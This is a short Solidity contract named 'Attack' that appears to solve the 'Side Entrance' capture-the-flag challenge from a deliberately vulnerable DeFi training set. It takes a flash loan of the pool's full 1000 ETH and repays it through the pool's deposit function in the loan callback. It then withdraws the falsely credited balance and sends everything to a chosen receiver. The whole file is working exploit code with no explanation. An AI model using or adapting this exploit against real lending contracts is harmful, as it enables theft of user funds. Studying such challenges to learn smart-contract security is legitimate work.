// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

interface ISideEntrance{
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract Attack{
    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18; 
    ISideEntrance sideEntrance;

    function execute() public payable{
        sideEntrance.deposit{value:ETHER_IN_POOL }();
    }

    function makeLoan(address _ISideEntrance) public{
        sideEntrance = ISideEntrance(_ISideEntrance);
        sideEntrance.flashLoan(ETHER_IN_POOL );
    }

    function withdraw(address receiver) public{
        sideEntrance.withdraw();
        receiver.call{value: address(this).balance}("");
    }

    receive() external payable {
        
    }
}

